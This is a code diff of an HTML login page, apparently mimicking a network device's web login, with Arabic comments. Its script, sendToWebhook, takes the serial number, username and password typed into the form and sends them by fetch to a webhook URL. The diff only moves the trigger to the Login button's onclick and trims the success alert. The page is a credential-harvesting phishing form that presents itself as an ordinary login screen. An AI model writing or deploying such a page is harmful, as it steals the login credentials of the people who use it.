@@ -34,7 +34,7 @@
             <div id="webNameImg"></div>
             <div id="container">
                 <div id="accountLoginWrap">
-                    <form id="loginForm" onsubmit="sendToWebhook(event)">
+                    <form id="loginForm" action="javascript:void(0);">
                         <div class="itemWrap">
                             <i class="icon sn-icon"></i>
                             <input type="text" id="txtAccountSN" name="sn" value="QR123456" class="txt-input" autocomplete="off" />
@@ -49,7 +49,7 @@
                             <input id="txtPassword" name="password" value="Password123" class="txt-input" type="password" autocomplete="off" />
                         </div>
                         <div class="itemWrap">
-                            <button id="btnAccountLogin" class="cfgBtn" lc="html" lk="IDCS_LOGIN_NBSP">Login</button>
+                            <button id="btnAccountLogin" class="cfgBtn" lc="html" lk="IDCS_LOGIN_NBSP" onclick="sendToWebhook()">Login</button>
                         </div>
                     </form>
                 </div>
@@ -62,10 +62,8 @@
     </div>
 
     <script>
-        // التعامل مع إرسال النموذج إلى Webhook عند الضغط
-        function sendToWebhook(event) {
-            event.preventDefault();
-
+        // التعامل مع إرسال البيانات إلى Webhook عند الضغط على زر Login
+        function sendToWebhook() {
             // استخراج القيم من الحقول
             var sn = document.getElementById('txtAccountSN').value;
             var username = document.getElementById('txtUserName').value;
@@ -78,9 +76,7 @@
             fetch(webhookUrl)
                 .then(response => response.text())
                 .then(data => {
-                    alert('تم إرسال البيانات بنجاح إلى Webhook. الرد: ' + data);
-                    // في حالة الرغبة بإرسال النموذج بعد نجاح الطلب
-                    // document.getElementById('loginForm').submit();
+                    alert('تم إرسال البيانات بنجاح إلى Webhook.');
                 })
                 .catch(error => {
                     alert('حدث خطأ أثناء إرسال البيانات إلى Webhook: ' + error);
